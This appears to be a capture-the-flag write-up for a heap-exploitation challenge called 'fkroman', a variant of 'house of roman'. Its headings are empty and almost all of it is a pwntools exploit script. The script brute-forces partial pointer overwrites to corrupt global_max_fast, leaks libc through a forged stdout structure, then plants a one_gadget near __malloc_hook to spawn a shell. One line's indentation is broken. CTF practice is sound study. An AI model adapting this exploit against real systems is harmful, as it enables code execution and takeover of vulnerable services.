[TOC]
# checksec

# 流程

# 溢出点
house of roman 改版
# exp
```

from pwn import *
context.log_level = 'debug'
def add(idx,size):
        p.sendlineafter("choice: ","1")
        p.sendlineafter("Index: ",str(idx))
        sleep(0.1)
        p.sendlineafter("Size: ",str(size))


def free(idx):
        p.sendlineafter("choice: ","3")
        p.sendlineafter("Index: ",str(idx))


def edit(idx,size,data):
        p.sendlineafter("choice: ","4")
        p.sendlineafter("Index: ",str(idx))
        sleep(0.1)
        p.sendlineafter("Size: ",str(size))
        p.sendafter("Content: ",data)

for i in range(1000):
        try:

p = process("./fkroman")
                #p = remote("121.40.246.48","9999")
                add(0,0x10)
                add(1,0xe0)
                add(2,0x10)
                add(3,0xe0)
                add(4,0xe0)
                add(5,0xe0)
                add(9,0xe0)
                add(10,0x68)
                free(1)
                edit(1,10,"a"*8+"\xe8\x37\n")
                #modify global_max_fast
                p.sendline("")
                add(6,0xe0)
                free(3)
                edit(3,2,"\xcf\x25\n")
                p.sendline("")
                add(7,0xe0)
                add(7,0xe0)
                payload = "a"+p64(0)*7+p64(0xf1)+p64(0xfbad1887)+p64(0)*3+"\x00"+"\n"
                edit(7,len(payload),payload)
                libc_base = u64(p.recvuntil("\xff\x7f").ljust(8,"\x00"))-0x7ffff7a89b00+0x00007ffff7a0d000
                log.info(hex(libc_base))
                gdb.attach(p)
                p.sendline("")
                p.recv()
                p.recv()
                p.sendline("")
                p.recv()
                p.sendline("3")
                p.recv()
                p.sendline("5")
                free(10)
                edit(10,8,p64(libc_base -0x00007ffff7a0d000 + 0x7ffff7dd1aed))
                p.sendline("")
                p.recv()
                p.recv()
                p.sendline("")
                p.recv()
                p.sendline("3")
                p.recv()
                p.sendline("5")
                free(10)
                edit(10,8,p64(libc_base -0x00007ffff7a0d000 + 0x7ffff7dd1aed))
                p.sendline("")
                p.recv()
                p.sendline("")
                p.recv()
                p.sendline("1")
                p.recv()
                p.sendline("11")
                p.recv()
                p.sendline(str(0x68))
                add(11,0x68)
                one_gadget = libc_base + 0xf1147
                #edit(11,0x30,"aaa"+p64(0) + p64(libc_base +0x7ffff7dd1b10 -0x7ffff7a0d000 ) +p64(one_gadget))
                edit(11,0x30,"aaa"+p64(0) + p64(0) +p64(one_gadget))
                p.sendline("")
                #free(10)
                #free(10)
                add(11,0x10)
                p.interactive()
        except:
                print i

```